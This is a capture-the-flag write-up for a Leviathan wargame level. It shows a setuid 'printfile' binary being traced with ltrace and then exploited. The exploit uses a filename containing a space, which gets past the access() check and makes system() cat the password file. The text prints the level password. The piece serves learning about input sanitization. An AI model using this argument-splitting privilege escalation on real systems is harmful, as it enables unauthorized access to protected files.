For this level, I use `ls -la` and find `printfile` executable with owner as leviathan3. The executable also gives permissions to leviathan2 for executing like so:
```
leviathan2@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Oct  5 06:19 .
drwxr-xr-x 83 root       root        4096 Oct  5 06:20 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Oct  5 06:19 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
```

From executing the printfile, I reckon the command works similar to `cat` like so:

```
leviathan2@gibson:~$ ./printfile /etc/host.conf
# The "order" line is only used by old versions of the C library.
order hosts,bind
multi on
```

As usual, I use objdump to look at its stack contents:
```
leviathan2@gibson:~$ objdump -T printfile

printfile:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*  00000000 (GLIBC_2.34) __libc_start_main
00000000      DF *UND*  00000000 (GLIBC_2.0)  printf
00000000      DF *UND*  00000000 (GLIBC_2.4)  __stack_chk_fail
00000000      DF *UND*  00000000 (GLIBC_2.0)  geteuid
00000000      DF *UND*  00000000 (GLIBC_2.0)  puts
00000000      DF *UND*  00000000 (GLIBC_2.0)  system
00000000  w   D  *UND*  00000000  Base        __gmon_start__
00000000      DF *UND*  00000000 (GLIBC_2.0)  setreuid
00000000      DF *UND*  00000000 (GLIBC_2.0)  snprintf
00000000      DF *UND*  00000000 (GLIBC_2.0)  access
0804a004 g    DO .rodata        00000004  Base        _IO_stdin_used
```

Though this didn't reveal much, I tried reading the password for leviathan3 directly, which unsurprisingly failed:

```
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Using ltrace, I observed the following function calls:

```
leviathan2@gibson:~$ ltrace ./printfile /etc/host.conf
__libc_start_main(0x80491e6, 2, 0xffffd684, 0 <unfinished ...>
access("/etc/host.conf", 4)                                                                                                         = 0
snprintf("/bin/cat /etc/host.conf", 511, "/bin/cat %s", "/etc/host.conf")                                                           = 23
geteuid()                                                                                                                           = 12002
geteuid()                                                                                                                           = 12002
setreuid(12002, 12002)                                                                                                              = 0
system("/bin/cat /etc/host.conf"# The "order" line is only used by old versions of the C library.
order hosts,bind
multi on
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                              = 0
+++ exited (status 0) +++
```

From this, the sequence seems to be:

    - Check if the file is accessible (access).
    - Store the command in a buffer (snprintf).
    - Change the user ID (geteuid and setreuid).
    - Execute the command (system).

From this, we need to somehow bypass the access check so that we can execute the command with elevated permissions (likely leviathan3).

So, we need to make a temporary file to call the `./printfile` 
executable. 
So, I made my temp folder with `mktemp -d` and stored a test file called `file.txt`.

However, what is strange to me is that `printfile` cannot execute my `file.txt` that is under the tmp file even with the same permissions. I even gave permissions like `chmod 777` to the test file which does not work.

After googling, the correct way to do it is to create a payload like so: `touch '<tmpDir>/a leviathan3'` and switch directory to where the password is stored and call the printfile command there and you'll get the output like so:

```
leviathan2@gibson:/etc/leviathan_pass$ ~/printfile '/tmp/tmp.0wDX4pzYkj/a leviathan3'
/bin/cat: /tmp/tmp.0wDX4pzYkj/a: Permission denied
Q0G8j4sakn
```

So, what I have learnt: you can use a filename as a payload with the file you want to bypass certain functions. Using filenames as payloads can be a powerful method to exploit poorly written programs. So, we need to sanitize and validate inputs, even if they're filenames.
This can be seen in the `ltrace`: 

```
leviathan2@gibson:/etc/leviathan_pass$ ltrace ~/printfile '/tmp/tmp.0wDX4pzYkj/a leviathan3'
__libc_start_main(0x80491e6, 2, 0xffffd644, 0 <unfinished ...>
access("/tmp/tmp.0wDX4pzYkj/a leviathan3"..., 4)                                                                                    = 0         acess is bypassed with the filename wow
snprintf("/bin/cat /tmp/tmp.0wDX4pzYkj/a l"..., 511, "/bin/cat %s", "/tmp/tmp.0wDX4pzYkj/a leviathan3"...)                          = 41        
geteuid()                                                                                                                           = 12002
geteuid()                                                                                                                           = 12002
setreuid(12002, 12002)                                                                                                              = 0
system("/bin/cat /tmp/tmp.0wDX4pzYkj/a l".../bin/cat: /tmp/tmp.0wDX4pzYkj/a: No such file or directory                                      the cat tmpfile is not allowed as the owner is leviathan2
/bin/cat: leviathan3: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                              = 256
+++ exited (status 0) +++
```
